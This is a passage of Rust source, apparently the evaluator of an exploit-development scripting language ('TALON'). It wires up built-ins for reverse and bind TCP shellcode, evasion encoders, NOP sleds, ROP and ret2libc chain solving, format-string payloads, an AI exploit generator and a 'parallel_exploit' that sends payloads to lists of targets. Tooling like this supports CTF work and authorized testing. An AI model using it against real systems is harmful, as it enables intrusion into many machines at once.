            let hay = eval_expr(haystack, vars.clone(), funcs.clone(), macros.clone()).await?.to_string();
            let re = Regex::new(regex).map_err(|e| e.to_string())?;
            Ok(Value::String(re.is_match(&hay).to_string()))
        }
        Expr::Await(expr) => eval_expr(expr, vars.clone(), funcs.clone(), macros.clone()).await, // Simplified async for now
        Expr::ComparisonOp { op, left, right } => {
            let l = eval_expr(left, vars.clone(), funcs.clone(), macros.clone()).await?;
            let r = eval_expr(right, vars.clone(), funcs.clone(), macros.clone()).await?;
            let result = match (&l, &r) {
                (Value::Number(lv), Value::Number(rv)) => match op.as_str() {
                    "==" => lv == rv,
                    "!=" => lv != rv,
                    "<" => lv < rv,
                    ">" => lv > rv,
                    "<=" => lv <= rv,
                    ">=" => lv >= rv,
                    _ => return Err(format!("Unknown comparison: {}", op)),
                },
                (Value::String(lv), Value::String(rv)) => match op.as_str() {
                    "==" => lv == rv,
                    "!=" => lv != rv,
                    _ => return Err("Only == and != supported for strings".into()),
                },
                _ => return Err(format!("Type mismatch in comparison: {:?} {} {:?}", l, op, r)),
            };
            Ok(Value::Number(if result { 1 } else { 0 }))
        }
        Expr::BitwiseOp { op, left, right } => {
            let l = eval_expr(left, vars.clone(), funcs.clone(), macros.clone()).await?;
            let r = eval_expr(right, vars.clone(), funcs.clone(), macros.clone()).await?;
            if let (Value::Number(l), Value::Number(r)) = (l, r) {
                let result = match op.as_str() {
                    "&" => l & r,
                    "|" => l | r,
                    "^" => l ^ r,
                    "<<" => l << r,
                    ">>" => l >> r,
                    _ => return Err(format!("Unknown bitwise operator: {}", op)),
                };
                Ok(Value::Number(result))
            } else {
                Err("Bitwise operations require numbers".into())
            }
        }
        Expr::Call { name, args } => {
            let mut arg_values = Vec::new();
            let mut arg_map = HashMap::new();
            
            for (arg_name, arg_expr) in args {
                let value = eval_expr(arg_expr, vars.clone(), funcs.clone(), macros.clone()).await?;
                arg_values.push(value.clone());
                if let Some(name) = arg_name {
                    arg_map.insert(name.clone(), value);
                }
            }
            
            match name.as_str() {
                "cyclic" => {
                    if arg_values.is_empty() {
                        return Err("cyclic() requires length argument".to_string());
                    }
                    if let Value::Number(length) = arg_values[0] {
                        let pattern = crate::cyclic_pattern::cyclic(length as usize);
                        Ok(Value::Bytes(pattern))
                    } else {
                        Err("cyclic() requires numeric length".to_string())
                    }
                }
                "cyclic_find" => {
                    if arg_values.len() < 2 {
                        return Err("cyclic_find() requires pattern and search value arguments".to_string());
                    }
                    let pattern = if let Value::Bytes(p) = &arg_values[0] {
                        p.clone()
                    } else {
                        return Err("cyclic_find() requires bytes pattern as first argument".to_string());
                    };
                    let search = arg_values[1].to_string();
                    
                    if let Some(offset) = crate::cyclic_pattern::cyclic_find(&pattern, &search) {
                        Ok(Value::Number(offset as i64))
                    } else {
                        Ok(Value::Null)
                    }
                }
                "shellcode" => {
                    let arch_str = arg_map.get("arch")
                        .or_else(|| arg_values.get(0))
                        .map(|v| v.to_string())
                        .unwrap_or_else(|| "x64".to_string());
                    
                    let payload_str = arg_map.get("payload")
                        .or_else(|| arg_values.get(1))
                        .map(|v| v.to_string())
                        .unwrap_or_else(|| "execve".to_string());
                    
                    let arch = crate::shellcode_library::parse_arch(&arch_str)
                        .map_err(|e| format!("Invalid architecture: {}", e))?;
                    
                    let payload = crate::shellcode_library::parse_payload(&payload_str)
                        .map_err(|e| format!("Invalid payload: {}", e))?;
                    
                    let lib = crate::shellcode_library::ShellcodeLibrary::new();
                    
                    let mut params_map = HashMap::new();
                    if let Some(lhost) = arg_map.get("lhost") {
                        params_map.insert("lhost".to_string(), lhost.to_string());
                    }
                    if let Some(lport) = arg_map.get("lport") {
                        params_map.insert("lport".to_string(), lport.to_string());
                    }
                    
                    let shellcode = lib.get_with_params(arch, payload, &params_map)
                        .map_err(|e| format!("Failed to generate shellcode: {}", e))?;
                    
                    Ok(Value::Bytes(shellcode))
                }
                "shellcode_gen" => {
                    let arch_str = arg_map.get("arch")
                        .or_else(|| arg_values.get(0))
                        .map(|v| v.to_string())
                        .unwrap_or_else(|| "x64".to_string());
                    
                    let payload_str = arg_map.get("payload")
                        .map(|v| v.to_string())
                        .unwrap_or_else(|| "execve_sh".to_string());
                    
                    let arch = crate::shellcode_library::parse_arch(&arch_str)
                        .map_err(|e| format!("Invalid architecture: {}", e))?;
                    
                    let payload = crate::shellcode_library::parse_payload(&payload_str)
                        .map_err(|e| format!("Invalid payload: {}", e))?;
                    
                    let lib = crate::shellcode_library::ShellcodeLibrary::new();
                    
                    let mut params_map = HashMap::new();
                    if let Some(lhost) = arg_map.get("lhost") {
                        params_map.insert("lhost".to_string(), lhost.to_string());
                    }
                    if let Some(lport) = arg_map.get("lport") {
                        params_map.insert("lport".to_string(), lport.to_string());
                    }
                    
                    let mut shellcode = lib.get_with_params(arch, payload, &params_map)
                        .map_err(|e| format!("Failed to generate shellcode: {}", e))?;
                    
                    // Apply encoding if requested
                    if let Some(encoder) = arg_map.get("encoder").map(|v| v.to_string()) {
                        use crate::shellcode_encoders::ShellcodeEncoder;
                        let mut enc = ShellcodeEncoder::new(shellcode.clone());
                        
                        shellcode = match encoder.as_str() {
                            "xor" => {
                                let key = if let Some(Value::Number(k)) = arg_map.get("key") {
                                    *k as u8
                                } else {
                                    enc.find_xor_key().unwrap_or(0x42)
                                };
                                enc.xor_encode(key).unwrap_or(shellcode)
                            }
                            "alphanumeric" | "alnum" => {
                                enc.alphanumeric_encode().unwrap_or(shellcode)
                            }
                            "unicode" => {
                                enc.unicode_encode().unwrap_or(shellcode)
                            }
                            "base64" => {
                                enc.base64_encode()
                            }
                            "url" => {
                                enc.url_encode()
                            }
                            _ => shellcode,
                        };
                    }
                    
                    // Add NOP sled if requested
                    if let Some(Value::Number(nop_size)) = arg_map.get("nop_sled") {
                        let nops = vec![0x90; *nop_size as usize];
                        shellcode = [nops, shellcode].concat();
                    }
                    
                    use colored::Colorize;
                    println!("{} Generated {} shellcode ({} bytes)", 
                        "[SHELLCODE]".cyan(), 
                        payload_str.yellow(), 
                        shellcode.len().to_string().green());
                    
                    Ok(Value::Bytes(shellcode))
                }
                "shellcode_encode" => {
                    if arg_values.is_empty() {
                        return Err("shellcode_encode() requires shellcode bytes".to_string());
                    }
                    
                    let shellcode = if let Value::Bytes(bytes) = &arg_values[0] {
                        bytes.clone()
                    } else {
                        return Err("shellcode_encode() requires bytes as first argument".to_string());
                    };
                    
                    let encoder_type = arg_map.get("encoder")
                        .or_else(|| arg_values.get(1))
                        .map(|v| v.to_string())
                        .unwrap_or_else(|| "xor".to_string());
                    
                    use crate::shellcode_encoders::ShellcodeEncoder;
                    let mut encoder = ShellcodeEncoder::new(shellcode.clone());
                    
                    // Set bad chars if provided
                    if let Some(Value::List(bad_chars_list)) = arg_map.get("bad_chars") {
                        let bad_chars: Vec<u8> = bad_chars_list.iter()
                            .filter_map(|v| {
                                if let Value::Number(n) = v {
                                    Some(*n as u8)
                                } else {
                                    None
                                }
                            })
                            .collect();
                        encoder.set_bad_chars(bad_chars);
                    }
                    
                    let encoded = match encoder_type.as_str() {
                        "xor" => {
                            let key = if let Some(Value::Number(k)) = arg_map.get("key") {
                                *k as u8
                            } else {
                                encoder.find_xor_key().ok_or("Failed to find valid XOR key")?
                            };
                            encoder.xor_encode(key)?
                        }
                        "alphanumeric" | "alnum" => encoder.alphanumeric_encode()?,
                        "unicode" => encoder.unicode_encode()?,
                        "base64" => encoder.base64_encode(),
                        "url" => encoder.url_encode(),
                        "polymorphic" => {
                            let min_nop = if let Some(Value::Number(n)) = arg_map.get("min_nop") {
                                *n as usize
                            } else {
                                1
                            };
                            let max_nop = if let Some(Value::Number(n)) = arg_map.get("max_nop") {
                                *n as usize
                            } else {
                                5
                            };
                            encoder.polymorphic_encode(min_nop, max_nop)
                        }
                        _ => return Err(format!("Unknown encoder type: {}", encoder_type)),
                    };
                    
                    use colored::Colorize;
                    println!("{} Encoded shellcode using {} ({} → {} bytes)", 
                        "[ENCODE]".cyan(), 
                        encoder_type.yellow(), 
                        shellcode.len().to_string().red(),
                        encoded.len().to_string().green());
                    
                    Ok(Value::Bytes(encoded))
                }
                "shellcode_reverse_tcp" => {
                    let lhost = arg_map.get("lhost")
                        .or_else(|| arg_values.get(0))
                        .map(|v| v.to_string())
                        .ok_or("shellcode_reverse_tcp() requires lhost parameter")?;
                    
                    let lport = if let Some(Value::Number(p)) = arg_map.get("lport").or_else(|| arg_values.get(1)) {
                        *p as u16
                    } else {
                        return Err("shellcode_reverse_tcp() requires lport parameter".to_string());
                    };
                    
                    let arch_str = arg_map.get("arch")
                        .map(|v| v.to_string())
                        .unwrap_or_else(|| "x64".to_string());
                    
                    let arch = crate::shellcode_library::parse_arch(&arch_str)
                        .map_err(|e| format!("Invalid architecture: {}", e))?;
                    
                    let lib = crate::shellcode_library::ShellcodeLibrary::new();
                    let mut params_map = HashMap::new();
                    params_map.insert("lhost".to_string(), lhost.clone());
                    params_map.insert("lport".to_string(), lport.to_string());
                    
                    let payload = crate::shellcode_library::Payload::ShellReverseTcp;
                    let shellcode = lib.get_with_params(arch, payload, &params_map)
                        .map_err(|e| format!("Failed to generate reverse TCP shellcode: {}", e))?;
                    
                    use colored::Colorize;
                    println!("{} Reverse TCP shell: {}:{} ({} bytes)", 
                        "[SHELLCODE]".cyan(), 
                        lhost.yellow(), 
                        lport.to_string().yellow(),
                        shellcode.len().to_string().green());
                    
                    Ok(Value::Bytes(shellcode))
                }
                "shellcode_bind_tcp" => {
                    let lport = if let Some(Value::Number(p)) = arg_map.get("lport").or_else(|| arg_values.get(0)) {
                        *p as u16
                    } else {
                        return Err("shellcode_bind_tcp() requires lport parameter".to_string());
                    };
                    
                    let arch_str = arg_map.get("arch")
                        .map(|v| v.to_string())
                        .unwrap_or_else(|| "x64".to_string());
                    
                    let arch = crate::shellcode_library::parse_arch(&arch_str)
                        .map_err(|e| format!("Invalid architecture: {}", e))?;
                    
                    let lib = crate::shellcode_library::ShellcodeLibrary::new();
                    let mut params_map = HashMap::new();
                    params_map.insert("lport".to_string(), lport.to_string());
                    
                    let payload = crate::shellcode_library::Payload::ShellBindTcp;
                    let shellcode = lib.get_with_params(arch, payload, &params_map)
                        .map_err(|e| format!("Failed to generate bind TCP shellcode: {}", e))?;
                    
                    use colored::Colorize;
                    println!("{} Bind TCP shell on port {} ({} bytes)", 
                        "[SHELLCODE]".cyan(), 
                        lport.to_string().yellow(),
                        shellcode.len().to_string().green());
                    
                    Ok(Value::Bytes(shellcode))
                }
                "nop_sled" => {
                    let size = if let Some(Value::Number(s)) = arg_values.get(0) {
                        *s as usize
                    } else {
                        return Err("nop_sled() requires size argument".to_string());
                    };
                    
                    let polymorphic = arg_map.get("polymorphic")
                        .map(|v| v.to_string())
                        .map(|s| s == "true" || s == "1")
                        .unwrap_or(false);
                    
                    use crate::shellcode_encoders;
                    let nops = if polymorphic {
                        shellcode_encoders::polymorphic_nop_sled(size, 1, 3)
                    } else {
                        shellcode_encoders::nop_sled(size)
                    };
                    
                    use colored::Colorize;
                    println!("{} NOP sled: {} bytes ({})", 
                        "[NOP]".cyan(), 
                        size.to_string().green(),
                        if polymorphic { "polymorphic".yellow() } else { "static".white() });
                    
                    Ok(Value::Bytes(nops))
                }
                "shellcode_list" => {
                    use crate::shellcode_db;
                    let db = shellcode_db::get_shellcode_db();
                    let all = shellcode_db::list_all_shellcodes();
                    
                    use colored::Colorize;
                    println!("{} Available shellcodes:", "[SHELLCODE]".cyan());
                    println!();
                    for name in all {
                        if let Some(entry) = db.get(&name) {
                            println!("  {} - {} ({} bytes, {})",
                                name.yellow(),
                                entry.description.white(),
                                entry.bytes.len().to_string().green(),
                                format!("{:?}", entry.arch).blue());
                        }
                    }
                    
                    Ok(Value::Null)
                }
                "rop_find" => {
                    if arg_values.is_empty() {
                        return Err("rop_find() requires binary path argument".to_string());
                    }
                    let binary = arg_values[0].to_string();
                    let pattern = arg_map.get("pattern")
                        .or_else(|| arg_values.get(1))
                        .map(|v| v.to_string());
                    
                    let mut finder = crate::rop_gadget_finder::ROPGadgetFinder::new(
                        crate::rop_gadget_finder::Architecture::X64
                    ).map_err(|e| format!("Failed to create ROP finder: {}", e))?;
                    
                    finder.analyze_file(&binary)
                        .map_err(|e| format!("Failed to analyze binary: {}", e))?;
                    
                    if let Some(pat) = pattern {
                        let gadgets = finder.find_gadgets_by_pattern(&pat);
                        let addresses: Vec<Value> = gadgets.iter()
                            .map(|g| Value::Number(g.address as i64))
                            .collect();
                        Ok(Value::List(addresses))
                    } else {
                        let gadgets = finder.get_best_gadgets(20);
                        let addresses: Vec<Value> = gadgets.iter()
                            .map(|g| Value::Number(g.address as i64))
                            .collect();
                        Ok(Value::List(addresses))
                    }
                }
                "rop_new" => {
                    if arg_values.is_empty() {
                        return Err("rop_new() requires binary path argument".to_string());
                    }
                    let binary = arg_values[0].to_string();
                    
                    let chain = crate::rop_tools::RopChain::new(&binary)
                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
                    
                    use colored::Colorize;
                    println!("{} ROP chain initialized", "[ROP]".cyan());
                    println!("  Binary: {}", binary.yellow());
                    println!("  Gadgets found: {}", chain.gadgets.len().to_string().green());
                    println!("  Architecture: {:?}", chain.arch);
                    
                    Ok(Value::String(format!("RopChain[{}]", binary)))
                }
                "rop_set_libc" => {
                    if arg_values.len() < 2 {
                        return Err("rop_set_libc() requires binary path and libc base address".to_string());
                    }
                    let binary = arg_values[0].to_string();
                    let base = if let Value::Number(n) = &arg_values[1] {
                        *n as u64
                    } else {
                        return Err("rop_set_libc() requires numeric libc base address".to_string());
                    };
                    
                    let mut chain = crate::rop_tools::RopChain::new(&binary)
                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
                    chain.set_libc_base(base);
                    
                    use colored::Colorize;
                    println!("{} libc base set to 0x{:x}", "[ROP]".cyan(), base);
                    Ok(Value::Null)
                }
                "rop_find_gadget" => {
                    if arg_values.len() < 2 {
                        return Err("rop_find_gadget() requires binary path and pattern".to_string());
                    }
                    let binary = arg_values[0].to_string();
                    let pattern = arg_values[1].to_string();
                    
                    let chain = crate::rop_tools::RopChain::new(&binary)
                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
                    
                    if let Some(addr) = chain.find_gadget(&pattern) {
                        use colored::Colorize;
                        println!("{} Gadget found: {} @ 0x{:016x}", "[ROP]".cyan(), pattern.yellow(), addr);
                        Ok(Value::Number(addr as i64))
                    } else {
                        Err(format!("Gadget not found: {}", pattern))
                    }
                }
                "rop_find_gadgets" => {
                    if arg_values.len() < 2 {
                        return Err("rop_find_gadgets() requires binary path and pattern".to_string());
                    }
                    let binary = arg_values[0].to_string();
                    let pattern = arg_values[1].to_string();
                    
                    let chain = crate::rop_tools::RopChain::new(&binary)
                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
                    
                    let gadgets = chain.find_gadgets(&pattern);
                    use colored::Colorize;
                    println!("{} Found {} gadgets matching '{}'", "[ROP]".cyan(), gadgets.len().to_string().green(), pattern.yellow());
                    
                    let addresses: Vec<Value> = gadgets.iter()
                        .map(|g| Value::Number(g.address as i64))
                        .collect();
                    Ok(Value::List(addresses))
                }
                "rop_build_chain" => {
                    if arg_values.len() < 2 {
                        return Err("rop_build_chain() requires binary path and address list".to_string());
                    }
                    let binary = arg_values[0].to_string();
                    
                    let addresses: Vec<u64> = if let Value::List(list) = &arg_values[1] {
                        list.iter()
                            .map(|v| match v {
                                Value::Number(n) => *n as u64,
                                _ => 0,
                            })
                            .collect()
                    } else {
                        return Err("rop_build_chain() requires list of addresses".to_string());
                    };
                    
                    let chain = crate::rop_tools::RopChain::new(&binary)
                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
                    
                    let chain_bytes = chain.build_chain(&addresses);
                    use colored::Colorize;
                    println!("{} ROP chain built: {} gadgets, {} bytes", 
                        "[ROP]".cyan(), 
                        addresses.len().to_string().green(), 
                        chain_bytes.len().to_string().yellow());
                    
                    Ok(Value::Bytes(chain_bytes))
                }
                "rop_ret2libc" => {
                    if arg_values.len() < 2 {
                        return Err("rop_ret2libc() requires binary path and command".to_string());
                    }
                    let binary = arg_values[0].to_string();
                    let cmd = arg_values[1].to_string();
                    
                    let mut chain = crate::rop_tools::RopChain::new(&binary)
                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
                    
                    if let Some(Value::Number(base)) = arg_map.get("libc_base") {
                        chain.set_libc_base(*base as u64);
                    }
                    
                    let addresses = chain.ret2libc(&cmd)
                        .map_err(|e| format!("ret2libc failed: {}", e))?;
                    
                    use colored::Colorize;
                    println!("{} ret2libc chain created", "[ROP]".cyan());
                    println!("  Command: {}", cmd.yellow());
                    println!("  Chain length: {} gadgets", addresses.len().to_string().green());
                    
                    let chain_bytes = chain.build_chain(&addresses);
                    Ok(Value::Bytes(chain_bytes))
                }
                "rop_ret2syscall" => {
                    if arg_values.len() < 2 {
                        return Err("rop_ret2syscall() requires binary path and syscall number".to_string());
                    }
                    let binary = arg_values[0].to_string();
                    let syscall_num = if let Value::Number(n) = &arg_values[1] {
                        *n as u64
                    } else {
                        return Err("rop_ret2syscall() requires numeric syscall number".to_string());
                    };
                    
                    let mut chain = crate::rop_tools::RopChain::new(&binary)
                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
                    
                    let arg1 = if let Some(Value::Number(n)) = arg_map.get("arg1") { *n as u64 } else { 0 };
                    let arg2 = if let Some(Value::Number(n)) = arg_map.get("arg2") { *n as u64 } else { 0 };
                    let arg3 = if let Some(Value::Number(n)) = arg_map.get("arg3") { *n as u64 } else { 0 };
                    
                    let addresses = chain.ret2syscall(syscall_num, arg1, arg2, arg3)
                        .map_err(|e| format!("ret2syscall failed: {}", e))?;
                    
                    use colored::Colorize;
                    println!("{} ret2syscall chain created", "[ROP]".cyan());
                    println!("  Syscall: {}", syscall_num.to_string().yellow());
                    println!("  Chain length: {} gadgets", addresses.len().to_string().green());
                    
                    let chain_bytes = chain.build_chain(&addresses);
                    Ok(Value::Bytes(chain_bytes))
                }
                "rop_solve" => {
                    use crate::rop_tools::{AutoROPSolver, ROPGoal, ROPStrategy};
                    
                    if arg_values.len() < 2 {
                        return Err("rop_solve() requires binary path and goal type".to_string());
                    }
                    let binary = arg_values[0].to_string();
                    let goal_type = arg_values[1].to_string();
                    
                    let mut solver = AutoROPSolver::new(&binary)
                        .map_err(|e| format!("Failed to create ROP solver: {}", e))?;
                    
                    if let Some(Value::Number(base)) = arg_map.get("libc_base") {
                        solver.libc_base = Some(*base as u64);
                    }
                    
                    let goal = match goal_type.as_str() {
                        "system" => {
                            let cmd = arg_map.get("cmd")
                                .or_else(|| arg_values.get(2))
                                .map(|v| v.to_string())
                                .unwrap_or_else(|| "/bin/sh".to_string());
                            ROPGoal::System(cmd)
                        }
                        "execve" => {
                            let cmd = arg_map.get("cmd")
                                .or_else(|| arg_values.get(2))
                                .map(|v| v.to_string())
                                .unwrap_or_else(|| "/bin/sh".to_string());
                            ROPGoal::Execve(cmd, vec![])
                        }
                        "mprotect" => {
                            let addr = if let Some(Value::Number(n)) = arg_map.get("addr") { *n as u64 } else { 0x600000 };
                            let size = if let Some(Value::Number(n)) = arg_map.get("size") { *n as u64 } else { 0x1000 };
                            let perms = if let Some(Value::Number(n)) = arg_map.get("perms") { *n as u64 } else { 7 };
                            ROPGoal::Mprotect(addr, size, perms)
                        }
                        _ => return Err(format!("Unknown goal type: {}", goal_type)),
                    };
                    
                    let strategies = if let Some(Value::List(strats)) = arg_map.get("strategies") {
                        strats.iter()
                            .filter_map(|v| {
                                match v.to_string().as_str() {
                                    "one_gadget" => Some(ROPStrategy::OneGadget),
                                    "ret2libc" => Some(ROPStrategy::Ret2Libc),
                                    "mprotect_rwx" => Some(ROPStrategy::MprotectRWX),
                                    "ret2syscall" => Some(ROPStrategy::Ret2Syscall),
                                    "srop" => Some(ROPStrategy::SROP),
                                    "jop" => Some(ROPStrategy::JOP),
                                    "cop" => Some(ROPStrategy::COP),
                                    "stack_pivot" => Some(ROPStrategy::StackPivot),
                                    _ => None,
                                }
                            })
                            .collect()
                    } else {
                        vec![ROPStrategy::Ret2Libc, ROPStrategy::Ret2Syscall]
                    };
                    
                    let solution = solver.solve(goal, strategies)
                        .map_err(|e| format!("ROP solver failed: {}", e))?;
                    
                    use colored::Colorize;
                    println!("{} ROP solution found!", "[SOLVER]".cyan().bold());
                    println!("  Strategy: {}", solution.strategy.green());
                    println!("  Gadgets used: {}", solution.gadgets_used.len().to_string().yellow());
                    println!("  Payload size: {} bytes", solution.chain_bytes.len().to_string().yellow());
                    println!("  Success probability: {:.1}%", (solution.success_probability * 100.0).to_string().green());
                    
                    Ok(Value::Bytes(solution.chain_bytes))
                }
                "rop_list_gadgets" => {
                    if arg_values.is_empty() {
                        return Err("rop_list_gadgets() requires binary path".to_string());
                    }
                    let binary = arg_values[0].to_string();
                    
                    let chain = crate::rop_tools::RopChain::new(&binary)
                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
                    
                    crate::rop_tools::list_common_gadgets(&chain);
                    Ok(Value::Null)
                }
                "rop_search" => {
                    if arg_values.len() < 2 {
                        return Err("rop_search() requires binary path and instruction pattern".to_string());
                    }
                    let binary = arg_values[0].to_string();
                    let pattern = arg_values[1].to_string();
                    
                    let chain = crate::rop_tools::RopChain::new(&binary)
                        .map_err(|e| format!("Failed to create ROP chain: {}", e))?;
                    
                    let gadgets = chain.find_gadgets(&pattern);
                    
                    use colored::Colorize;
                    println!("{} ROP Gadget Search Results", "[ROP]".cyan().bold());
                    println!("  Pattern: {}", pattern.yellow());
                    println!("  Found: {} gadgets\n", gadgets.len().to_string().green());
                    
                    for (i, gadget) in gadgets.iter().take(20).enumerate() {
                        println!("  {}. 0x{:016x}: {}", 
                            i + 1, 
                            gadget.address, 
                            gadget.instructions.join("; ").cyan());
                    }
                    
                    if gadgets.len() > 20 {
                        println!("\n  ... and {} more", gadgets.len() - 20);
                    }
                    
                    let addresses: Vec<Value> = gadgets.iter()
                        .map(|g| Value::Number(g.address as i64))
                        .collect();
                    Ok(Value::List(addresses))
                }
                "fmtstr_payload" => {
                    let offset = if let Some(Value::Number(off)) = arg_map.get("offset").or_else(|| arg_values.get(0)) {
                        *off as usize
                    } else {
                        return Err("fmtstr_payload() requires offset argument".to_string());
                    };
                    
                    let writes = if let Some(Value::Map(w)) = arg_map.get("writes").or_else(|| arg_values.get(1)) {
                        w.iter()
                            .map(|(k, v)| {
                                let addr = k.parse::<u64>().unwrap_or(0);
                                let value = if let Value::Number(n) = v {
                                    *n as u64
                                } else {
                                    0
                                };
                                (addr, value)
                            })
                            .collect()
                    } else {
                        Vec::new()
                    };
                    
                    let arch = if arg_map.get("arch").map(|v| v.to_string()).as_deref() == Some("x86") {
                        crate::format_string::Architecture::X86
                    } else {
                        crate::format_string::Architecture::X64
                    };
                    
                    let payload = crate::format_string::create_format_string_payload(offset, writes, arch)
                        .map_err(|e| format!("Failed to generate format string payload: {}", e))?;
                    
                    Ok(Value::Bytes(payload))
                }
                "interactive" => {
                    if arg_values.is_empty() {
                        return Err("interactive() requires socket/connection argument".to_string());
                    }
                    
                    let host = arg_map.get("host")
                        .or_else(|| arg_values.get(0))
                        .map(|v| v.to_string())
                        .unwrap_or_else(|| "127.0.0.1".to_string());
                    
                    let port = if let Some(Value::Number(p)) = arg_map.get("port").or_else(|| arg_values.get(1)) {
                        *p as u16
                    } else {
                        1337
                    };
                    
                    let mut shell = crate::interactive_shell::create_interactive_shell(&host, port)
                        .map_err(|e| format!("Failed to create interactive shell: {}", e))?;
                    
                    shell.start()
                        .map_err(|e| format!("Interactive shell error: {}", e))?;
                    
                    Ok(Value::String("Interactive session closed".to_string()))
                }
                "disasm" => {
                    if arg_values.is_empty() {
                        return Err("disasm() requires bytes or file path argument".to_string());
                    }
                    
                    let disasm = crate::disasm_visualizer::DisassemblerVisualizer::new_x64()
                        .map_err(|e| format!("Failed to create disassembler: {}", e))?;
                    
                    let output = if let Value::Bytes(bytes) = &arg_values[0] {
                        let addr = if let Some(Value::Number(a)) = arg_map.get("addr") {
                            *a as u64
                        } else {
                            0x400000
                        };
                        disasm.disassemble_bytes(bytes, addr)
                            .map_err(|e| format!("Disassembly failed: {}", e))?
                    } else {
                        let path = arg_values[0].to_string();
                        let offset = if let Some(Value::Number(o)) = arg_map.get("offset") {
                            *o as usize
                        } else {
                            0
                        };
                        let length = if let Some(Value::Number(l)) = arg_map.get("length") {
                            *l as usize
                        } else {
                            256
                        };
                        let addr = if let Some(Value::Number(a)) = arg_map.get("addr") {
                            *a as u64
                        } else {
                            0x400000
                        };
                        disasm.disassemble_file(&path, offset, length, addr)
                            .map_err(|e| format!("Disassembly failed: {}", e))?
                    };
                    
                    println!("{}", output);
                    Ok(Value::String("Disassembly complete".to_string()))
                }
                "parallel_exploit" => {
                    use crate::parallel_exploit::exploit_parallel;
                    
                    if arg_values.len() < 2 {
                        return Err("parallel_exploit() requires targets list and payload".to_string());
                    }
                    
                    let targets = if let Value::List(t) = &arg_values[0] {
                        t.iter().map(|v| v.to_string()).collect()
                    } else {
                        return Err("parallel_exploit() requires list of target strings".to_string());
                    };
                    
                    let payload_bytes = match &arg_values[1] {
                        Value::Bytes(b) => b.clone(),
                        Value::String(s) => s.as_bytes().to_vec(),
                        _ => return Err("parallel_exploit() requires bytes or string payload".to_string()),
                    };
                    
                    let results = exploit_parallel(targets, payload_bytes).await
                        .map_err(|e| format!("Parallel exploitation failed: {}", e))?;
                    
                    let success_count = results.iter().filter(|r| r.success).count();
                    let result_list: Vec<Value> = results.iter()
                        .map(|r| Value::String(format!("{}: {}", r.target, if r.success { "success" } else { "failed" })))
                        .collect();
                    
                    println!("[PARALLEL] Successfully exploited {}/{} targets", success_count, results.len());
                    Ok(Value::List(result_list))
                }
                "generate_exploit" => {
                    use crate::ai_exploit_gen::{generate_exploit_ai, AIConfig};
                    use colored::*;
                    
                    if arg_values.is_empty() {
                        return Err("generate_exploit() requires binary path".to_string());
                    }
                    
                    let binary = arg_values[0].to_string();
                    let vuln_type = arg_map.get("vuln_type")
                        .or_else(|| arg_values.get(1))
                        .map(|v| v.to_string())
                        .unwrap_or_else(|| "buffer_overflow".to_string());
                    let arch = arg_map.get("arch")
                        .or_else(|| arg_values.get(2))
                        .map(|v| v.to_string())
                        .unwrap_or_else(|| "x64".to_string());
                    
                    println!("{} Generating exploit for {}", "🤖".cyan(), binary.yellow());
                    
                    let config = AIConfig::default();
                    match generate_exploit_ai(&binary, &vuln_type, &arch, Some(config)) {
                        Ok(response) => {
                            if response.success {
                                println!("{} {}\n", "[OK]".green(), "Exploit generated successfully".green().bold());
                                println!("{}", response.exploit_code);
                                Ok(Value::String(response.exploit_code))
                            } else {
                                Err("Exploit generation failed".to_string())
                            }
                        }
                        Err(e) => Err(e),
                    }
                }
                "help" => {
                    use crate::doc_generator::DocGenerator;
                    use colored::Colorize;
                    let doc_gen = DocGenerator::new();
                    
                    if arg_values.is_empty() {
                        println!("\n{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
                        println!("{}", "║              TALON FUNCTION DOCUMENTATION                 ║".cyan().bold());
                        println!("{}\n", "╚═══════════════════════════════════════════════════════════╝".cyan());
                        println!("{}", "Usage:".yellow().bold());
                        println!("  {} - Show function documentation", "help(\"function_name\")".green());
                        println!("  {} - Search for functions", "help(search: \"keyword\")".green());
                        println!("\n{}", "Available modules:".yellow().bold());
                        for module in doc_gen.list_modules() {
                            println!("  {} {}", "•".cyan(), module.magenta());
                        }
                        println!("\n{}", "Examples:".yellow().bold());
                        println!("  {} - View cyclic function docs", "help(\"cyclic\")".cyan());
                        println!("  {} - Search for ROP functions", "help(search: \"rop\")".cyan());
                        println!("  {} - Search for shellcode", "help(search: \"shell\")".cyan());
                        Ok(Value::Null)
                    } else {
                        if let Some(search_query) = arg_map.get("search") {
                            let query = search_query.to_string();
                            doc_gen.display_search_results(&query);
                        } else {
                            let func_name = arg_values[0].to_string();
                            doc_gen.display_function(&func_name);
                        }
                        Ok(Value::Null)
                    }
                }
                "p64" | "pack64" => {
                    if arg_values.is_empty() {
                        return Err("p64() requires a numeric argument".to_string());
                    }
                    if let Value::Number(n) = arg_values[0] {
                        use crate::packing_tools::pack64;
                        Ok(Value::Bytes(pack64(n as u64)))
                    } else {
                        Err(format!("p64() requires number, got {:?}", arg_values[0]))
                    }
                }
                "p32" | "pack32" => {
                    if arg_values.is_empty() {
                        return Err("p32() requires a numeric argument".to_string());
                    }
                    if let Value::Number(n) = arg_values[0] {
                        use crate::packing_tools::pack32;
                        Ok(Value::Bytes(pack32(n as u32)))
                    } else {
                        Err(format!("p32() requires number, got {:?}", arg_values[0]))
                    }
                }
                "p16" | "pack16" => {
                    if arg_values.is_empty() {
                        return Err("p16() requires a numeric argument".to_string());
                    }
                    if let Value::Number(n) = arg_values[0] {
                        use crate::packing_tools::pack16;
                        Ok(Value::Bytes(pack16(n as u16)))
                    } else {
                        Err(format!("p16() requires number, got {:?}", arg_values[0]))
                    }
                }
                "u64" | "unpack64" => {
                    if arg_values.is_empty() {
                        return Err("u64() requires bytes argument".to_string());
                    }
                    let bytes = match &arg_values[0] {
                        Value::Bytes(b) => b.clone(),
                        Value::String(s) => s.as_bytes().to_vec(),
                        _ => return Err(format!("u64() requires bytes, got {:?}", arg_values[0])),
                    };
                    use crate::packing_tools::unpack64;
                    let value = unpack64(&bytes)?;
                    Ok(Value::Number(value as i64))
                }
                "u32" | "unpack32" => {
                    if arg_values.is_empty() {
                        return Err("u32() requires bytes argument".to_string());
                    }
                    let bytes = match &arg_values[0] {
                        Value::Bytes(b) => b.clone(),
                        Value::String(s) => s.as_bytes().to_vec(),
